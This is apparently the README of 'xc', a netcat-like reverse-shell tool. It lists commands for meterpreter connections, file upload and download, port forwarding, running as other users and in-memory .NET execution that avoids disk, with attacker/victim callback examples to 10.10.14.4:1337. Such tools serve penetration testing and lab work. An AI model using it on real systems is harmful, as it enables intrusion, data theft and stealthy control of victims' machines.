# xc

Netcat like reverse shell for Linux & Windows. This is still experimental - pull requests are welcome :)

## Features

### Windows

``` 
 !runas <username> <password> <domain>
   - restart xc with the specified user
 !runasps <username> <password> <domain>
   - restart xc with the specified user using powershell
 !met <port>
   - connects to a x64/meterpreter/reverse_tcp listener
 !upload <src> <dst>
   - uploads a file to the target
 !download <src> <dst>
   - downloads a file from the target
 !lfwd <localport> <remoteaddr> <remoteport>
   - local portforwarding (like ssh -L)
 !rfwd <remoteport> <localaddr> <localport>
   - remote portforwarding (like ssh -R)
 !vulns
   - checks for common vulnerabilities
 !plugins
   - lists available plugins
 !plugin <plugin>
   - execute a plugin
 !rc <port>
   - connects to a local bind shell and restarts this client over it
 !spawn <port>
   - spawns another client on the specified port
 !shell
 !powershell
 !net <sample.exe> <arg1> <arg2> ...   
   - Runs a .NET assembly from the server on the client without touching disk
 !exit
``` 

### Linux

```
 !runas <username> <password> <domain>
   - restart xc with the specified user
 !met <port>
   - connects to a x64/meterpreter/reverse_tcp listener
 !upload <src> <dst>
   - uploads a file to the target
 !download <src> <dst>
   - downloads a file from the target
 !lfwd <localport> <remoteaddr> <remoteport>
   - local portforwarding (like ssh -L)
 !rfwd <remoteport> <localaddr> <localport>
   - remote portforwarding (like ssh -R)
 !plugins
   - lists available plugins
 !plugin <plugin>
   - execute a plugin
 !rc <port>
   - connects to a local bind shell and restarts this client over it
 !spawn <port>
   - spawns another client on the specified port
 !shell
 !ssh <port>
 !exit
``` 

## Examples

- Linux Attacker:	`xc -l -p 1337`			    (Server)
- WindowsVictim :   `xc.exe 10.10.14.4 1337`	(Client)
- Argumentless:     `xc_10.10.14.4_1337.exe`    (Client)

## Setup

``` 
go get github.com/hashicorp/yamux
go get github.com/ropnop/go-clr
``` 

Windows:
```
go build
```

Linux:
```
make
```